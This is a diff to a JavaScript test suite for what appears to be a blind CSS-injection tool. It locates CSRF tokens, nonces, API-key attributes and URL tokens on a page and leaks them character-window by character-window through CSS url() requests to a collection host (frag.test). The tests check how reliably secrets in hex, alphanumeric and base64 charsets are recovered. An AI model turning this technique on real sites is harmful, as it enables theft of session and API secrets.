@@ -9,7 +9,8 @@ const test = require('node:test');
 const assert = require('node:assert/strict');
 
 const B = require('../public/blind');
-const { stitchUnknownLength } = require('../lib/stitch');
+const P = require('../public/payload');
+const { stitchUnknownLength, stitchCharset } = require('../lib/stitch');
 const { SEED, rng } = require('./helpers');
 const { el, page, requests, reconHits, fieldData } = require('./blind-helpers');
 
@@ -20,15 +21,24 @@ function extractOne(doc, field) {
   const payload = B.extractPayload([{ id: 0, ...field }]);
   const data = fieldData(requests(doc, payload)).get(0);
   if (!data) return null;
-  return stitchUnknownLength(data, { windowSize: field.windowSize, whole: WHOLE.has(field.kind) });
+  return stitchCharset(data, {
+    charset: P.charsetOf(field.charset),
+    unknownLength: true,
+    windowSize: P.windowSizeFor(field.charset, field.windowSize),
+    whole: WHOLE.has(field.kind),
+  });
 }
+
+// Random tokens and junk in a charset (base64 padding only ends a value).
+const charsOf = charset => P.alphabetOf(P.charsetOf(charset)).replace(charset === 'base64' ? '=' : '', '');
+const CASED = ['alnum', 'base64', 'base64url'];
 
 const listed = (res, secret) => Boolean(res) && (res.candidates || [res.token]).includes(secret);
 const single = (res, secret) => Boolean(res) && !res.candidates && res.token === secret;
 
 // --- recon -------------------------------------------------------------------
 
-test('recon finds wordlist fields, their hosts and whether they are hex', () => {
+test('recon finds wordlist fields, their hosts and their charsets', () => {
   const hex40 = rng(SEED + 100).hex(40);
   const shown = el('form', {});
   const hiddenForm = el('form', {}, { rendered: false });
@@ -45,6 +55,7 @@ test('recon finds wordlist fields, their hosts and whether they are hex', () => 
     el('meta', { name: 'csrf-token', content: hex40 }),
     el('meta', { name: 'csrf-param', content: 'authenticity_token' }),
     el('meta', { name: 'viewport', content: 'width=device-width' }),
+    el('meta', { name: 'nonce', content: 'two words' }),
     el('a', { href: `https://x.test/cb?state=zz&code=${hex40}&op=1` }),
     el('form', { action: `/login?TOKEN=${hex40}` }),
     el('div', { 'data-api-key': hex40 }),
@@ -54,19 +65,42 @@ test('recon finds wordlist fields, their hosts and whether they are hex', () => 
   const { fields, unlistedInputs } = recon(doc);
   // Grouped by kind, in wordlist order.
   assert.deepEqual(fields, [
-    { kind: 'input', name: 'csrf_token', host: 'form', hex: true },
-    { kind: 'input', name: 'authenticity_token', host: 'html', hex: false },
-    { kind: 'input', name: 'nonce', host: 'html', hex: true },
-    { kind: 'input', name: '_wpnonce', host: 'form', hex: false },
-    { kind: 'meta', name: 'csrf-token', host: 'self', hex: true },
-    { kind: 'meta', name: 'csrf-param', host: 'self', hex: false },
-    { kind: 'form', name: 'token', host: 'self', hex: null },
-    { kind: 'a', name: 'code', host: 'self', hex: null },
-    { kind: 'a', name: 'state', host: 'self', hex: null },
-    { kind: 'data', name: 'data-api-key', host: 'self', hex: true },
-    { kind: 'data', name: 'data-nonce', host: 'html', hex: false },
+    { kind: 'input', name: 'csrf_token', host: 'form', charset: 'hex' },
+    { kind: 'input', name: 'authenticity_token', host: 'html', charset: 'base64' },
+    { kind: 'input', name: 'nonce', host: 'html', charset: 'hex' },
+    { kind: 'input', name: '_wpnonce', host: 'form', charset: 'base64url' },
+    { kind: 'meta', name: 'csrf-token', host: 'self', charset: 'hex' },
+    { kind: 'meta', name: 'csrf-param', host: 'self', charset: 'base64url' },
+    { kind: 'meta', name: 'nonce', host: 'self', charset: false },
+    { kind: 'form', name: 'token', host: 'self', charset: null },
+    { kind: 'a', name: 'code', host: 'self', charset: null },
+    { kind: 'a', name: 'state', host: 'self', charset: null },
+    { kind: 'data', name: 'data-api-key', host: 'self', charset: 'hex' },
+    { kind: 'data', name: 'data-nonce', host: 'html', charset: 'alnum' },
   ]);
   assert.equal(unlistedInputs, true, '"lang" is not in the wordlist');
+});
+
+test('recon tells each charset apart for inputs, meta and data attributes', () => {
+  const values = {
+    hex: '0123456789abcdef',
+    alnum: 'aZ09bY18cX27',
+    base64: 'aZ+09/bY==',
+    base64url: 'aZ-09_bY',
+  };
+  for (const [charset, value] of Object.entries(values)) {
+    const form = el('form', {});
+    const doc = page([
+      form,
+      el('input', { type: 'hidden', name: 'csrf', value }, { form }),
+      el('meta', { name: 'csrf-token', content: value }),
+      el('div', { 'data-token': value }),
+    ]);
+    assert.deepEqual(recon(doc).fields.map(f => f.charset), [charset, charset, charset], `${charset}: ${value}`);
+  }
+  // Uppercase A-F makes it alphanumeric rather than lowercase hex.
+  const doc = page([el('meta', { name: 'csrf-token', content: 'DEADBEEF' })]);
+  assert.equal(recon(doc).fields[0].charset, 'alnum');
 });
 
 test('recon with no matching fields reports nothing', () => {
@@ -131,6 +165,29 @@ test('extract URLs are namespaced by field and carry no duplicate props', () => 
   for (const r of extract.rules) assert.match(r.path, /^b\/(0|5)\/((s|e|r)\/[0-9a-f]{2}|[0-9a-f]{3})$/);
   const windowProps = extract.rules.filter(r => /^b\/\d+\/[0-9a-f]{3}$/.test(r.path)).map(r => r.prop);
   assert.equal(new Set(windowProps).size, windowProps.length);
+});
+
+test('non-hex extract payloads: case pairs, encoded slashes and valid, unique props', () => {
+  const extract = B.extractPayload([
+    { id: 0, kind: 'a', name: 'code', host: 'self', windowSize: 3, charset: 'base64' },
+    { id: 1, kind: 'input', name: 'csrf', host: 'form', windowSize: 4, charset: 'alnum' },
+  ]);
+  const paths = extract.rules.map(r => r.path);
+  assert.ok(paths.includes('b/0/c/aB') && paths.includes('b/0/c/%2FA') && paths.includes('b/0/a%2Fb'));
+  assert.ok(paths.includes('b/0/e/%2F%2F') && paths.includes('b/0/r/+='));
+  assert.ok(paths.includes('b/1/abc') && !paths.includes('b/1/abcd'), 'non-hex fields use 3-char windows');
+  for (const r of extract.rules) {
+    assert.match(r.prop, /^[\w-]+$/, `property name ${r.prop}`);
+    assert.match(r.path, /^b\/[01]\/((s|e|r|c)\/)?[\w+=%-]+$/);
+    // Windows and anchors are case-insensitive, case pairs are not.
+    const tests = [...(r.test.attrs || []), ...(r.test.is || [])];
+    assert.ok(tests.every(t => Boolean(t[3]) === !r.path.includes('/c/')), r.path);
+  }
+  // Window and case-pair props are never shared.
+  const own = extract.rules.filter(r => !/\/[ser]\//.test(r.path)).map(r => r.prop);
+  assert.equal(new Set(own).size, own.length);
+  const css = B.render(extract, 'http://frag.test');
+  assert.equal(css.match(/\{--[\w-]+:url\(/g).length, extract.rules.length);
 });
 
 // --- extraction ------------------------------------------------------------------
@@ -204,6 +261,30 @@ for (const sc of WHOLE_SCENARIOS) {
   }
 }
 
+// Non-hex charsets use 3-char windows over their 36-39 lowercased chars,
+// which are about as sparse as hex 4-char windows, plus case pairs.
+const CHARSET_WHOLE_EXPECT = { lengths: [6, 64], step: 3, listed: 0.97, single: 0.7 };
+
+for (const sc of WHOLE_SCENARIOS) {
+  for (const charset of CASED) {
+    test(`unknown-length extraction: ${sc.name}, ${charset}`, t => {
+      const r = rng(SEED + 5000 + CASED.indexOf(charset) * 10 + WHOLE_SCENARIOS.indexOf(sc));
+      const { lengths: [min, max], step, ...expect } = CHARSET_WHOLE_EXPECT;
+      let runs = 0, listedN = 0, singleN = 0;
+      for (let length = min; length <= max; length += step) {
+        const secret = r.chars(charsOf(charset), length);
+        const res = extractOne(sc.doc(secret, r), { ...sc.field, windowSize: 3, charset });
+        runs++;
+        listedN += listed(res, secret);
+        singleN += single(res, secret);
+      }
+      t.diagnostic(`listed ${listedN}/${runs}, single correct guess ${singleN}/${runs}`);
+      assert.ok(listedN / runs >= expect.listed, `listed ${listedN}/${runs}`);
+      assert.ok(singleN / runs >= expect.single, `single ${singleN}/${runs}`);
+    });
+  }
+}
+
 // URL params: the token sits among other params, with random hex junk before
 // and after it. Junk can genuinely make two tokens fit the data equally well
 // (a chance overlap lets the token's tail swap with a junk param's), in which
@@ -227,6 +308,37 @@ for (const kind of ['a', 'form']) {
             `&token=${secret}&operation=login&x=${r.hex(r.int(4, 40))}`;
           const doc = page([kind === 'a' ? el('a', { href: url }) : el('form', { action: url })]);
           const res = extractOne(doc, { kind, name: 'token', host: 'self', windowSize: k });
+          runs++;
+          listedN += listed(res, secret);
+          singleN += single(res, secret);
+        }
+      }
+      t.diagnostic(`listed ${listedN}/${runs}, single correct guess ${singleN}/${runs}`);
+      assert.ok(listedN / runs >= expect.listed, `listed ${listedN}/${runs}`);
+      assert.ok(singleN / runs >= expect.single, `single ${singleN}/${runs}`);
+    });
+  }
+}
+
+// With a non-hex charset most of the URL leaks too ("https", "example",
+// "callback", ...), but the token is still usually listed.
+// The single-guess rate varies a lot between seeds (~25-65%).
+const CHARSET_URL_EXPECT = { lengths: [8, 40], listed: 0.85, single: 0.15 };
+
+for (const kind of ['a', 'form']) {
+  for (const charset of CASED) {
+    test(`unknown-length extraction: ${kind} URL param with ${charset} junk`, t => {
+      const r = rng(SEED + 6000 + CASED.indexOf(charset) * 10 + kind.length);
+      const { lengths: [min, max], ...expect } = CHARSET_URL_EXPECT;
+      const chars = n => r.chars(charsOf(charset), n);
+      let runs = 0, listedN = 0, singleN = 0;
+      for (let length = min; length <= max; length += 4) {
+        for (let i = 0; i < 3; i++) {
+          const secret = chars(length);
+          const url = `https://example.com/m/callback/email?state=${chars(r.int(4, 20))}` +
+            `&token=${secret}&operation=login&x=${chars(r.int(4, 40))}`;
+          const doc = page([kind === 'a' ? el('a', { href: url }) : el('form', { action: url })]);
+          const res = extractOne(doc, { kind, name: 'token', host: 'self', windowSize: 3, charset });
           runs++;
           listedN += listed(res, secret);
           singleN += single(res, secret);
@@ -278,6 +390,13 @@ test('a value that is not pure hex gives no token rather than a wrong one', () =
   assert.equal(extractOne(doc, { kind: 'meta', name: 'csrf-token', host: 'self', windowSize: 4 }), null);
 });
 
+test('a value outside the chosen charset gives no token rather than a wrong one', () => {
+  const doc = page([el('meta', { name: 'csrf-token', content: 'aZ09+bY18/cX27' })]);
+  assert.equal(extractOne(doc, { kind: 'meta', name: 'csrf-token', host: 'self', charset: 'base64url' }), null);
+  assert.equal(extractOne(doc, { kind: 'meta', name: 'csrf-token', host: 'self', charset: 'base64' }).token,
+    'aZ09+bY18/cX27');
+});
+
 // --- capacity ----------------------------------------------------------------------
 
 test('fields move to a fallback host when theirs is full, and error when nothing fits', () => {
@@ -303,6 +422,37 @@ test('fields move to a fallback host when theirs is full, and error when nothing
   const data = fieldData(requests(doc, B.extractPayload(two.fields)));
   for (const f of two.fields) {
     assert.ok(listed(stitchUnknownLength(data.get(f.id), { windowSize: 4 }), secrets[f.id]), f.name);
+  }
+});
+
+test('a non-hex field takes a whole host, like a 4-char hex field', () => {
+  const input = (id, name, charset) => ({ id, kind: 'input', name, host: 'form', windowSize: 3, charset });
+  for (const charset of CASED) {
+    const two = B.assignHosts([input(0, 'csrf', charset), input(1, 'nonce', charset)]);
+    assert.deepEqual(two.fields.map(f => f.host), ['form', 'html'], charset);
+    assert.match(B.assignHosts([input(0, 'csrf', charset), input(1, 'nonce', charset), input(2, '_token', charset)]).error,
+      /no room for _token/);
+  }
+  // Every non-hex field, even a URL param, fits within one element's boxes.
+  for (const charset of CASED) {
+    const fields = [{ id: 0, kind: 'a', name: 'code', host: 'self', windowSize: 3, charset }];
+    assert.doesNotThrow(() => B.generateBlindCSS(fields, 'http://frag.test'));
+  }
+
+  // Both inputs are recovered, case included.
+  const r = rng(SEED + 4001);
+  const secrets = [r.chars(charsOf('base64'), 40), r.chars(charsOf('alnum'), 32)];
+  const form = el('form', {});
+  const doc = page([
+    form,
+    el('input', { type: 'hidden', name: 'csrf', value: secrets[0] }, { form }),
+    el('input', { type: 'hidden', name: 'nonce', value: secrets[1] }, { form }),
+  ]);
+  const fields = B.assignHosts([input(0, 'csrf', 'base64'), input(1, 'nonce', 'alnum')]).fields;
+  const data = fieldData(requests(doc, B.extractPayload(fields)));
+  for (const f of fields) {
+    const res = stitchCharset(data.get(f.id), { charset: P.charsetOf(f.charset), unknownLength: true, windowSize: 3 });
+    assert.ok(listed(res, secrets[f.id]), `${f.name}: ${JSON.stringify(res)}`);
   }
 });
 
